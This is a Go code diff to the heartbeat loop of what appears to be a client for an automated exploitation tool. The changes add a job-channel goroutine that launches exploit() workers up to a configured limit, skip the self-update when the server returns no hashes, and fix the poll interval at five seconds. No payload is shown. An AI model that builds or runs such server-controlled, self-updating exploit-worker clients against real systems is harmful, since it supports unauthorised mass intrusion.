@@ -6,15 +6,16 @@ import (
 	"bytes"
 	"crypto/tls"
 	"encoding/json"
-	"github.com/shirou/gopsutil/v3/cpu"
-	"github.com/shirou/gopsutil/v3/host"
-	"github.com/shirou/gopsutil/v3/mem"
 	"log"
 	"net/http"
 	"net/url"
 	"runtime"
 	"strconv"
 	"time"
+
+	"github.com/shirou/gopsutil/v3/cpu"
+	"github.com/shirou/gopsutil/v3/host"
+	"github.com/shirou/gopsutil/v3/mem"
 )
 
 var heartbeat_delay int
@@ -24,6 +25,19 @@ func heartbeat() {
 		if err := recover(); err != nil {
 			log.Println("Heartbeat Error:", err)
 			go heartbeat()
+		}
+	}()
+	go func() {
+		for {
+			select {
+			case <-jobsChan:
+				jobsMutex.Lock()
+				if currentJobs < config.Client_worker {
+					currentJobs++
+					go exploit()
+				}
+				jobsMutex.Unlock()
+			}
 		}
 	}()
 	for {
@@ -78,10 +92,14 @@ func heartbeat() {
 				log.Println(err)
 			}
 			found := false
-			for _, hash := range result["sha256"].([]interface{}) {
-				if hash == update.Sha256Hash[0] {
-					found = true
-					break
+			if result["sha256"] == nil {
+				found = true
+			} else {
+				for _, hash := range result["sha256"].([]interface{}) {
+					if hash == update.Sha256Hash[0] {
+						found = true
+						break
+					}
 				}
 			}
 			if found == false && config.Client_update == true {
@@ -89,7 +107,7 @@ func heartbeat() {
 				go update.Replace()
 			} else {
 				jobsMutex.Lock()
-				if currentJobs <= maxWorkers {
+				if currentJobs < config.Client_worker {
 					currentJobs++
 					go exploit()
 				}
@@ -97,6 +115,6 @@ func heartbeat() {
 			}
 			go monitor()
 		}
-		time.Sleep(time.Second * time.Duration(heartbeat_delay))
+		time.Sleep(time.Second * 5)
 	}
 }
